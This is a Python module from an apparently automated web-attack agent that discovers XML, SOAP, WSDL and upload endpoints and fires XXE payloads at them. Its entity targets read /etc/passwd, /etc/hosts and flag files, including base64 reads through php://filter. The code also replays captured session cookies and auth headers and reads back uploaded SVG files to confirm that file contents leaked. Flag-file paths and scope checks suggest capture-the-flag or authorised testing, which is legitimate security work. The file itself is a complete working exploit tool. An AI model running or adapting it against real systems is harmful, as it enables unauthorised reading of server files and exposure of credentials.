from __future__ import annotations

import re
import secrets
from urllib.parse import urlsplit

from ravage.agent_core.agent_state import AgentState
from ravage.deterministic_agents.auth_forms import _forms_from_html
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, form_defaults, inject_query_param
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.probe_suite_parts.support import (
    _dedupe,
    _form_brief,
    _form_targets,
    _form_text,
    _list_of_dicts,
    _surface_endpoints,
)
from ravage.web_core.proof_recognizer import recognize_proofs

_XXE_BUDGET = 64
_XXE_WSDL_DISCOVERY_BUDGET = 12
_XXE_FORM_DISCOVERY_BUDGET = 18
_XXE_PATHS = (
    "/soap_service",
    "/soap-service",
    "/soapService",
    "/wsdl",
    "/?wsdl",
    "/soap",
    "/soap.php",
    "/api/soap_service",
    "/api/soap",
    "/xml",
    "/api/xml",
    "/xmlrpc",
    "/xmlrpc.php",
    "/ws",
    "/webservice",
    "/service",
    "/services",
    "/import",
    "/upload",
    "/profile",
    "/api",
)
_XXE_DISCOVERY_PATHS = (
    "/",
    "/dashboard",
    "/home",
    "/account",
    "/accounts",
    "/wsdl",
    "/?wsdl",
    "/xml",
    "/api/xml",
    "/upload",
    "/import",
    "/profile",
    "/admin",
)
_ENTITY_TARGETS = (
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/cwd/flag.txt",
    "file:///proc/self/cwd/flag",
    "file:///app/flag.txt",
    "file:///app/flag",
    "file:///FLAG.txt",
    "file:///flag",
    "file:///flag.txt",
    "file:///proof.txt",
    "file:///tmp/flag",
    "file:///tmp/flag.txt",
    "file:///app/FLAG.txt",
    "file:///app/flag",
    "file:///app/flag.txt",
    "php://filter/convert.base64-encode/resource=/FLAG.txt",
    "php://filter/convert.base64-encode/resource=/flag",
    "php://filter/convert.base64-encode/resource=/flag.txt",
)


def probe_xxe_boundary(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    findings: list[dict[str, object]] = []
    deferred_findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    budget = _XXE_BUDGET
    auth_header_variants = _auth_header_variants(state)
    wsdl_budget = min(budget, _XXE_WSDL_DISCOVERY_BUDGET)
    wsdl_payloads, wsdl_urls, wsdl_requests, budget = _discover_wsdl_payloads(
        session,
        state,
        auth_header_variants=auth_header_variants,
        budget=wsdl_budget,
    )
    budget += _XXE_BUDGET - wsdl_budget
    requests.extend(wsdl_requests)
    forms = _xxe_forms(state)
    form_discovery_budget = min(budget, _XXE_FORM_DISCOVERY_BUDGET)
    discovered_forms, observed_payloads, observed_urls, discovery_requests, budget = _discover_xxe_forms(
        session,
        state,
        auth_header_variants=auth_header_variants,
        budget=form_discovery_budget,
    )
    budget += (_XXE_BUDGET - len(wsdl_requests)) - form_discovery_budget
    forms = _dedupe_forms(forms + discovered_forms)
    requests.extend(discovery_requests)
    for form in forms:
        if budget <= 0:
            break
        file_field = _file_field(form)
        if file_field:
            for payload in _xxe_payloads(svg=True)[:10]:
                if budget <= 0:
                    break
                filename = "ravage_xxe_" + secrets.token_hex(4) + ".svg"
                response = _submit_xxe_upload(session, form, file_field=file_field, filename=filename, payload=payload)
                budget -= 1
                requests.append(
                    response.summary(body_chars=520)
                    | {"probe_kind": "xxe_svg_upload", "form": _form_brief(form), "file_field": file_field}
                )
                finding = _xxe_finding(response=response, vector="svg_upload", target={"form": _form_brief(form)})
                if finding:
                    if finding.get("proofs"):
                        findings.append(finding)
                        return _result(findings, requests, budget)
                    deferred_findings.append(finding)
                readback_findings, readback_requests, budget = _probe_xxe_upload_readbacks(
                    session,
                    form=form,
                    filename=filename,
                    upload_response=response,
                    budget=budget,
                )
                requests.extend(readback_requests)
                proof_readbacks = [item for item in readback_findings if item.get("proofs")]
                if proof_readbacks:
                    findings.extend(proof_readbacks)
                    return _result(findings, requests, budget)
                deferred_findings.extend(readback_findings)
            continue
        for field in _xml_fields(form)[:4]:
            for payload in _xxe_payloads(svg=False)[:12]:
                if budget <= 0:
                    break
                response = _submit_xml_form(session, form, field=field, payload=payload)
                budget -= 1
                requests.append(
                    response.summary(body_chars=520)
                    | {"probe_kind": "xxe_form_xml", "form": _form_brief(form), "field": field}
                )
                finding = _xxe_finding(response=response, vector="form_xml", target={"form": _form_brief(form), "field": field})
                if finding:
                    if finding.get("proofs"):
                        findings.append(finding)
                        return _result(findings, requests, budget)
                    deferred_findings.append(finding)
    raw_payloads = _dedupe(observed_payloads + wsdl_payloads + _xxe_payloads(svg=False))
    for url in _xxe_candidate_urls(session, state, forms=forms, extra_urls=observed_urls + wsdl_urls):
        if budget <= 0:
            break
        for payload in raw_payloads[:24]:
            if budget <= 0:
                break
            for auth_headers in auth_header_variants:
                if budget <= 0:
                    break
                headers = dict(auth_headers)
                headers["Content-Type"] = "application/xml"
                response = session.request(
                    "POST",
                    url,
                    data=payload.encode("utf-8"),
                    headers=headers,
                )
                budget -= 1
                requests.append(
                    response.summary(body_chars=420)
                    | {"probe_kind": "xxe_raw_xml", "url": url, "auth": bool(auth_headers)}
                )
                finding = _xxe_finding(response=response, vector="raw_xml", target={"url": url, "auth": bool(auth_headers)})
                if finding:
                    if finding.get("proofs"):
                        findings.append(finding)
                        return _result(findings, requests, budget)
                    deferred_findings.append(finding)
    return _result(findings + deferred_findings, requests, budget)


def _result(findings: list[dict[str, object]], requests: list[dict[str, object]], budget: int) -> ProbeRunResult:
    return ProbeRunResult(
        ok=bool(findings),
        probe="xxe_boundary",
        summary=f"tested XML/SOAP/upload XXE surfaces, requests={_XXE_BUDGET - budget}, findings={len(findings)}",
        findings=findings[:20],
        requests=requests[:80],
    )


def _xxe_candidate_urls(
    session: ProbeSession,
    state: AgentState,
    *,
    forms: list[dict[str, object]],
    extra_urls: list[str] | None = None,
) -> list[str]:
    urls: list[str] = []
    for endpoint in _surface_endpoints(state):
        lowered = endpoint.lower()
        if any(marker in lowered for marker in ("xml", "soap", "wsdl", "import", "upload", "avatar", "picture", "profile", "file")):
            urls.append(endpoint)
    for link in state.signals.get("links", []):
        text = str(link).strip()
        lowered = text.lower()
        if any(marker in lowered for marker in ("xml", "soap", "wsdl", "import", "upload", "avatar", "picture", "profile", "file")):
            urls.append(text)
    urls.extend(extra_urls or [])
    urls.extend(session.absolute(path) for path in _XXE_PATHS)
    for form in forms:
        action = str(form.get("action") or "")
        if action:
            urls.append(action)
    scoped: list[str] = []
    for url in urls:
        candidate = url if url.startswith(("http://", "https://")) else session.absolute(url)
        if session.in_scope(candidate):
            scoped.append(candidate)
    return _prioritize_xxe_urls(_dedupe(scoped), session)[:16]


def _discover_xxe_forms(
    session: ProbeSession,
    state: AgentState,
    *,
    auth_header_variants: list[dict[str, str]],
    budget: int,
) -> tuple[list[dict[str, object]], list[str], list[str], list[dict[str, object]], int]:
    urls: list[str] = [session.absolute(path) for path in _XXE_DISCOVERY_PATHS]
    for endpoint in _surface_endpoints(state):
        lowered = endpoint.lower()
        if any(marker in lowered for marker in ("xml", "soap", "import", "upload", "profile", "admin", "file")):
            urls.append(endpoint)
    for link in state.signals.get("links", []):
        text = str(link).strip()
        lowered = text.lower()
        if any(marker in lowered for marker in ("xml", "soap", "import", "upload", "profile", "admin", "file")):
            urls.append(text)
    forms: list[dict[str, object]] = []
    payloads: list[str] = []
    soap_urls: list[str] = []
    requests: list[dict[str, object]] = []
    for url in _dedupe([candidate for candidate in urls if session.in_scope(candidate)])[:10]:
        if budget <= 0:
            break
        for auth_headers in auth_header_variants:
            if budget <= 0:
                break
            response = session.get(url, headers=auth_headers or None)
            budget -= 1
            requests.append(
                response.summary(body_chars=260)
                | {"probe_kind": "xxe_form_discovery", "url": url, "auth": bool(auth_headers)}
            )
            if response.status not in {200, 201, 202}:
                continue
            payloads.extend(_operation_payloads_from_observed_xml(response.body))
            soap_urls.extend(_soap_urls_from_observed_body(session, response.body))
            for form in _forms_from_html(response.final_url, response.body, auth_headers=auth_headers, base_categories=()):
                if _form_looks_xxe_relevant(form):
                    forms.append(form)
    return _dedupe_forms(forms)[:12], _dedupe(payloads)[:36], _dedupe(soap_urls)[:8], requests, budget


def _discover_wsdl_payloads(
    session: ProbeSession,
    state: AgentState,
    *,
    auth_header_variants: list[dict[str, str]],
    budget: int,
) -> tuple[list[str], list[str], list[dict[str, object]], int]:
    urls = [session.absolute("/wsdl"), session.absolute("/?wsdl")]
    for endpoint in _surface_endpoints(state):
        lowered = endpoint.lower()
        if "wsdl" in lowered:
            urls.append(endpoint)
        if "soap" in lowered or "xml" in lowered:
            urls.append(endpoint.rstrip("/") + "?wsdl")
    payloads: list[str] = []
    soap_urls: list[str] = []
    requests: list[dict[str, object]] = []
    for url in _dedupe([candidate for candidate in urls if session.in_scope(candidate)])[:8]:
        if budget <= 0:
            break
        for auth_headers in auth_header_variants:
            if budget <= 0:
                break
            response = session.get(url, headers=auth_headers or None)
            budget -= 1
            requests.append(
                response.summary(body_chars=520)
                | {"probe_kind": "xxe_wsdl_discovery", "url": url, "auth": bool(auth_headers)}
            )
            if response.status not in {200, 201, 202}:
                continue
            body = response.body
            if "definitions" not in body.lower() and "xsd:element" not in body.lower():
                continue
            payloads.extend(_operation_payloads_from_wsdl(body))
            soap_urls.extend(_soap_addresses_from_wsdl(session, body))
    return _dedupe(payloads)[:36], _dedupe(soap_urls)[:8], requests, budget


def _prioritize_xxe_urls(urls: list[str], session: ProbeSession) -> list[str]:
    def score(url: str) -> tuple[int, int, int, str]:
        path = urlsplit(url).path.lower()
        query = urlsplit(url).query.lower()
        exact_priority = {"/soap_service": 0, "/soap-service": 1, "/soapservice": 2}.get(path, 9)
        if path in {"/soap_service", "/soap-service", "/soapservice"}:
            rank = 0
        elif "soap_service" in path or "soap-service" in path:
            rank = 1
        elif "soap" in path and "wsdl" not in query:
            rank = 2
        elif "xml" in path or "service" in path or "import" in path:
            rank = 3
        elif "upload" in path or "profile" in path or "file" in path:
            rank = 4
        elif "wsdl" in path or "wsdl" in query:
            rank = 5
        else:
            rank = 6
        same_origin_bias = 0 if url.startswith(session.origin.rstrip("/") + "/") else 1
        return (rank, exact_priority, same_origin_bias, url)

    return sorted(urls, key=score)


def _xxe_forms(state: AgentState) -> list[dict[str, object]]:
    forms: list[dict[str, object]] = []
    for form in _form_targets(state, limit=16):
        if _form_looks_xxe_relevant(form):
            forms.append(form)
    return forms


def _form_looks_xxe_relevant(form: dict[str, object]) -> bool:
    text = _form_text(form)
    return bool(_file_field(form) or _xml_fields(form) or any(marker in text for marker in ("xml", "soap", "svg", "import", "upload")))


def _dedupe_forms(forms: list[dict[str, object]]) -> list[dict[str, object]]:
    result: list[dict[str, object]] = []
    seen: set[str] = set()
    for form in forms:
        inputs = tuple(
            sorted(
                str(item.get("name") or "")
                for item in _list_of_dicts(form.get("inputs"))
                if str(item.get("name") or "")
            )
        )
        key = "|".join((str(form.get("method") or "GET").upper(), str(form.get("action") or ""), ",".join(inputs)))
        if key in seen:
            continue
        seen.add(key)
        result.append(form)
    return result


def _xml_fields(form: dict[str, object]) -> list[str]:
    names: list[str] = []
    for item in _list_of_dicts(form.get("inputs")):
        name = str(item.get("name") or "")
        input_type = str(item.get("type") or "").lower()
        lowered = name.lower()
        if not name or input_type in {"hidden", "submit", "button", "file"}:
            continue
        if input_type == "textarea" or any(marker in lowered for marker in ("xml", "soap", "body", "data", "content", "payload", "document")):
            names.append(name)
    return _dedupe(names)


def _file_field(form: dict[str, object]) -> str:
    for item in _list_of_dicts(form.get("inputs")):
        name = str(item.get("name") or "")
        if name and str(item.get("type") or "").lower() == "file":
            return name
    return ""


def _xxe_payloads(*, svg: bool) -> list[str]:
    payloads: list[str] = []
    for index, entity_target in enumerate(_ENTITY_TARGETS):
        entity_name = "xxe" + str(index)
        if svg:
            payloads.append(
                '<?xml version="1.0"?>'
                f'<!DOCTYPE svg [<!ENTITY {entity_name} SYSTEM "{entity_target}">]>'
                f"<svg xmlns=\"http://www.w3.org/2000/svg\"><text>&{entity_name};</text></svg>"
            )
        else:
            payloads.append(
                '<?xml version="1.0"?>'
                f'<!DOCTYPE root [<!ENTITY {entity_name} SYSTEM "{entity_target}">]>'
                f"<root><value>&{entity_name};</value></root>"
            )
            payloads.append(
                '<?xml version="1.0"?>'
                f'<!DOCTYPE soapenv:Envelope [<!ENTITY {entity_name} SYSTEM "{entity_target}">]>'
                '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                f"<soapenv:Body><value>&{entity_name};</value></soapenv:Body></soapenv:Envelope>"
            )
    return payloads


def _operation_payloads_from_wsdl(body: str) -> list[str]:
    operations = _wsdl_request_elements(body)
    if not operations:
        return _operation_payloads_from_observed_xml(body)
    return _operation_payloads_from_operations(operations)


def _operation_payloads_from_observed_xml(body: str) -> list[str]:
    operations: list[tuple[str, tuple[str, ...]]] = []
    for match in re.finditer(
        r"<([A-Za-z_][A-Za-z0-9_.:-]*Request)\b[^>]*>(.*?)</\1>",
        body,
        flags=re.IGNORECASE | re.DOTALL,
    ):
        operation = match.group(1).split(":")[-1]
        block = match.group(2)
        fields = tuple(
            field.split(":")[-1]
            for field in re.findall(
                r"<([A-Za-z_][A-Za-z0-9_.:-]*)\b[^>/]*>[^<]*</\1>",
                block,
                flags=re.IGNORECASE | re.DOTALL,
            )
            if not field.lower().endswith("request")
        )
        if operation:
            operations.append((operation, fields or ("value",)))
    return _operation_payloads_from_operations(_dedupe_operations(operations))


def _operation_payloads_from_operations(operations: list[tuple[str, tuple[str, ...]]]) -> list[str]:
    payloads: list[str] = []
    for operation, fields in operations[:8]:
        field_names = fields or ("value",)
        for index, entity_target in enumerate(_ENTITY_TARGETS[:12]):
            entity_name = "xxe" + str(index)
            payloads.append(_operation_payload(operation, field_names, entity_name, entity_target))
            payloads.append(_soap_operation_payload(operation, field_names, entity_name, entity_target))
    return _dedupe(payloads)


def _soap_urls_from_observed_body(session: ProbeSession, body: str) -> list[str]:
    urls: list[str] = []
    for match in re.finditer(
        r"""fetch\(\s*['"]([^'"]*(?:soap|xml|service)[^'"]*)['"]""",
        body,
        flags=re.IGNORECASE,
    ):
        url = match.group(1).strip()
        if url:
            urls.append(url if url.startswith(("http://", "https://")) else session.absolute(url))
    return _dedupe(urls)


def _wsdl_request_elements(body: str) -> list[tuple[str, tuple[str, ...]]]:
    elements: list[tuple[str, tuple[str, ...]]] = []
    pattern = re.compile(
        r"<(?:[A-Za-z0-9_]+:)?element\b[^>]*\bname=[\"']([^\"']*Request)[\"'][^>]*>(.*?)</(?:[A-Za-z0-9_]+:)?element>",
        flags=re.IGNORECASE | re.DOTALL,
    )
    for match in pattern.finditer(body):
        name = match.group(1)
        block = match.group(2)
        fields = tuple(
            field
            for field in re.findall(
                r"<(?:[A-Za-z0-9_]+:)?element\b[^>]*\bname=[\"']([^\"']+)[\"'][^>]*\btype=",
                block,
                flags=re.IGNORECASE,
            )
            if field != name
        )
        if name and (fields or name.lower().endswith("request")):
            elements.append((name, fields))
    if elements:
        return _dedupe_operations(elements)
    for match in re.finditer(r"<([A-Za-z0-9_:-]*Request)\b[^>]*>(.*?)</\1>", body, flags=re.IGNORECASE | re.DOTALL):
        name = match.group(1).split(":")[-1]
        fields = tuple(
            field.split(":")[-1]
            for field in re.findall(r"<([A-Za-z0-9_:-]+)\b[^>]*>[^<]*</\1>", match.group(2), flags=re.IGNORECASE)
        )
        elements.append((name, fields))
    return _dedupe_operations(elements)


def _dedupe_operations(operations: list[tuple[str, tuple[str, ...]]]) -> list[tuple[str, tuple[str, ...]]]:
    result: list[tuple[str, tuple[str, ...]]] = []
    seen: set[tuple[str, tuple[str, ...]]] = set()
    for operation, fields in operations:
        key = (operation, fields)
        if key in seen:
            continue
        seen.add(key)
        result.append((operation, fields))
    return result


def _operation_payload(operation: str, fields: tuple[str, ...], entity_name: str, entity_target: str) -> str:
    field_xml = _operation_fields_xml(fields, entity_name)
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE {operation} [<!ENTITY {entity_name} SYSTEM "{entity_target}">]>'
        f"<{operation}>{field_xml}</{operation}>"
    )


def _soap_operation_payload(operation: str, fields: tuple[str, ...], entity_name: str, entity_target: str) -> str:
    field_xml = _operation_fields_xml(fields, entity_name)
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE soapenv:Envelope [<!ENTITY {entity_name} SYSTEM "{entity_target}">]>'
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
        f"<soapenv:Body><{operation}>{field_xml}</{operation}></soapenv:Body></soapenv:Envelope>"
    )


def _operation_fields_xml(fields: tuple[str, ...], entity_name: str) -> str:
    parts: list[str] = []
    for index, field in enumerate(fields):
        value = f"&{entity_name};" if index == 0 else "ravage"
        safe_field = re.sub(r"[^A-Za-z0-9_:-]", "", field) or "value"
        parts.append(f"<{safe_field}>{value}</{safe_field}>")
    return "".join(parts)


def _soap_addresses_from_wsdl(session: ProbeSession, body: str) -> list[str]:
    urls: list[str] = []
    for match in re.finditer(
        r"<(?:[A-Za-z0-9_]+:)?address\b[^>]*\blocation=[\"']([^\"']+)[\"']",
        body,
        flags=re.IGNORECASE,
    ):
        location = match.group(1).strip()
        if not location:
            continue
        urls.append(location)
        parsed = urlsplit(location)
        if parsed.path:
            urls.append(session.absolute(parsed.path))
    return _dedupe(urls)


def _auth_header_variants(state: AgentState) -> list[dict[str, str]]:
    variants: list[dict[str, str]] = []
    for cookie in state.signals.get("cookies", [])[-8:]:
        text = str(cookie).strip()
        if not text:
            continue
        text = re.sub(r"(?i)^cookie:\s*", "", text).split(";", 1)[0].strip()
        if "=" in text:
            variants.append({"Cookie": text})
    for value in state.signals.get("auth_headers", [])[-8:]:
        headers = _parse_auth_header_signal(str(value))
        if headers:
            variants.append(headers)
    variants.append({})
    deduped: list[dict[str, str]] = []
    seen: set[tuple[tuple[str, str], ...]] = set()
    for headers in variants:
        key = tuple(sorted(headers.items()))
        if key in seen:
            continue
        seen.add(key)
        deduped.append(headers)
    return deduped[:6]


def _parse_auth_header_signal(value: str) -> dict[str, str]:
    if not value:
        return {}
    if "[redacted]" in value or "..." in value:
        return {}
    match = re.match(r"([^:]+):\s*(.+)", value)
    if match:
        return {match.group(1).strip(): match.group(2).strip()}
    return {}


def _probe_xxe_upload_readbacks(
    session: ProbeSession,
    *,
    form: dict[str, object],
    filename: str,
    upload_response: ProbeResponse,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    headers = _form_headers(form)
    for url in _xxe_uploaded_file_candidates(session, form, filename, upload_response):
        if budget <= 0:
            break
        response = session.get(url, headers=headers or None)
        budget -= 1
        requests.append(
            response.summary(body_chars=520)
            | {"probe_kind": "xxe_upload_readback", "url": url, "filename": filename, "auth": bool(headers)}
        )
        finding = _xxe_finding(response=response, vector="svg_upload_readback", target={"url": url})
        if finding:
            findings.append(finding)
            if finding.get("proofs"):
                break
    return findings, requests, budget


def _xxe_uploaded_file_candidates(
    session: ProbeSession,
    form: dict[str, object],
    filename: str,
    response: ProbeResponse,
) -> list[str]:
    candidates = _paths_from_upload_response(response.body, filename)
    for directory in _upload_directories(form):
        candidates.append(directory.rstrip("/") + "/" + filename)
    return _dedupe([session.absolute(candidate) for candidate in candidates if candidate])[:10]


def _paths_from_upload_response(body: str, filename: str) -> list[str]:
    paths: list[str] = []
    escaped = re.escape(filename)
    patterns = [
        rf"""(?:href|src)=["']([^"']*{escaped})["']""",
        rf"""((?:/|uploads?/|files?/|images?/|media/|static/)[A-Za-z0-9_./-]*{escaped})""",
    ]
    for pattern in patterns:
        for match in re.finditer(pattern, body, flags=re.IGNORECASE):
            paths.append(match.group(1))
    return paths


def _upload_directories(form: dict[str, object]) -> list[str]:
    action = str(form.get("action") or "/")
    action_path = urlsplit(action).path or "/"
    base_dir = action_path.rsplit("/", 1)[0] or "/"
    base = base_dir.rstrip("/")
    return _dedupe(
        [
            "/static/images",
            "/static/uploads",
            "/static/files",
            "/media",
            "/uploads",
            "/upload",
            "/files",
            "/images",
            base + "/static/images",
            base + "/uploads",
            base + "/files",
            base + "/images",
        ]
    )


def _submit_xml_form(session: ProbeSession, form: dict[str, object], *, field: str, payload: str) -> ProbeResponse:
    method = str(form.get("method") or "GET").upper()
    action = str(form.get("action") or session.target_url)
    fields = form_defaults(form)
    fields[field] = payload
    headers = _form_headers(form)
    if method == "POST":
        return session.post_form(action, fields, headers=headers or None)
    url = action
    for name, value in fields.items():
        url = inject_query_param(url, name, value)
    return session.get(url, headers=headers or None)


def _submit_xxe_upload(
    session: ProbeSession,
    form: dict[str, object],
    *,
    file_field: str,
    filename: str,
    payload: str,
) -> ProbeResponse:
    action = str(form.get("action") or session.target_url)
    boundary = "----RavageXXE" + secrets.token_hex(8)
    fields = form_defaults(form)
    body = _multipart_body(
        boundary=boundary,
        fields=fields,
        file_field=file_field,
        filename=filename,
        content_type="image/svg+xml",
        file_body=payload.encode("utf-8"),
    )
    headers = _form_headers(form)
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    return session.request("POST", action, data=body, headers=headers)


def _form_headers(form: dict[str, object]) -> dict[str, str]:
    raw = form.get("auth_headers")
    if not isinstance(raw, dict):
        return {}
    headers: dict[str, str] = {}
    for key, value in raw.items():
        name = str(key).strip()
        if name:
            headers[name] = str(value)
    return headers


def _multipart_body(
    *,
    boundary: str,
    fields: dict[str, str],
    file_field: str,
    filename: str,
    content_type: str,
    file_body: bytes,
) -> bytes:
    chunks: list[bytes] = []
    for name, value in fields.items():
        if name == file_field:
            continue
        chunks.append(f"--{boundary}\r\n".encode("ascii"))
        chunks.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode("utf-8"))
        chunks.append(value.encode("utf-8", errors="replace") + b"\r\n")
    chunks.append(f"--{boundary}\r\n".encode("ascii"))
    chunks.append(
        (
            f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode("utf-8")
    )
    chunks.append(file_body + b"\r\n")
    chunks.append(f"--{boundary}--\r\n".encode("ascii"))
    return b"".join(chunks)


def _xxe_finding(*, response: ProbeResponse, vector: str, target: dict[str, object]) -> dict[str, object] | None:
    proofs = recognize_proofs(response.body)
    if proofs:
        return {
            "type": "xxe_extracted_proof",
            "vector": vector,
            "target": target,
            "proofs": proofs,
            "response": response.summary(body_chars=900),
            "replay": {"method": response.method, "url": response.url},
        }
    if _file_read_markers(response.body):
        return {
            "type": "xxe_file_read_signal",
            "vector": vector,
            "target": target,
            "markers": _file_read_markers(response.body),
            "response": response.summary(body_chars=700),
            "next": "XXE file read is confirmed; vary entity SYSTEM file targets toward proof-bearing paths.",
        }
    return None


def _file_read_markers(body: str) -> list[str]:
    lowered = body.lower()
    markers = []
    if "root:x:0:0" in lowered:
        markers.append("root:x:0:0")
    if re.search(r"(?m)^[a-z_][a-z0-9_-]{0,31}:x:\d+:\d+:", body):
        markers.append("passwd_entry")
    if re.search(r"(?m)^\s*(?:127\.0\.0\.1|::1)\s+localhost\b", body, flags=re.IGNORECASE):
        markers.append("hosts_localhost")
    return markers[:4]
